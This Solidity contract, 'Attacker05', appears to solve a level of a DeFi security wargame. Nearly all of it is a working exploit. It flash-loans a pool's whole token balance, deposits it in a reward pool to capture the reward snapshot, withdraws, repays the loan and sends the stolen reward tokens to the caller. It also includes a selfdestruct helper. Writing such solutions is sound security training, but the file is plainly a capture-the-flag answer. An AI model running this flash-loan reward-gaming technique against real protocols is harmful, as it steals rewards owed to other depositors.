// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

/**
 * @title Attacker
 * @author DB
 */

interface IRewarderPool {
    function deposit(uint256 amountToDeposit) external;

    function withdraw(uint256 amountToWithdraw) external;

    function distributeRewards() external;
}

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

contract Attacker05 {
    using Address for address payable;

    address flashLoanerPool;
    address rewarderPool;
    address dvtToken;
    address rewardToken;

    constructor(
        address _flashLoanerPool,
        address _rewarderPool,
        address _dvtToken,
        address _rewardToken
    ) {
        flashLoanerPool = _flashLoanerPool;
        rewarderPool = _rewarderPool;
        dvtToken = _dvtToken;
        rewardToken = _rewardToken;
    }

    function selfDestruct(address accountToSend) external {
        address payable account = payable(accountToSend);
        selfdestruct(account);
    }

    receive() external payable {
        console.log("REC  - ", msg.value);
    }

    function getReward() external payable {
        IFlashLoanerPool fpool = IFlashLoanerPool(flashLoanerPool);
        IERC20 token = IERC20(dvtToken);

        uint256 amount = token.balanceOf(address(fpool));
        fpool.flashLoan(amount);

        IERC20 rwToken = IERC20(rewardToken);

        uint256 rwTokenBalance = rwToken.balanceOf(address(this));
        console.log("rwTokenBalance ", rwTokenBalance);

        rwToken.transfer(msg.sender, rwTokenBalance);
    }

    function receiveFlashLoan(uint256 _amount) external {
        IERC20 token = IERC20(dvtToken);
        token.approve(rewarderPool, _amount);

        IRewarderPool rpool = IRewarderPool(rewarderPool);
        rpool.deposit(_amount);
        rpool.withdraw(_amount);
        token.transfer(flashLoanerPool, _amount);
        console.log("AT14  - ");
    }
}
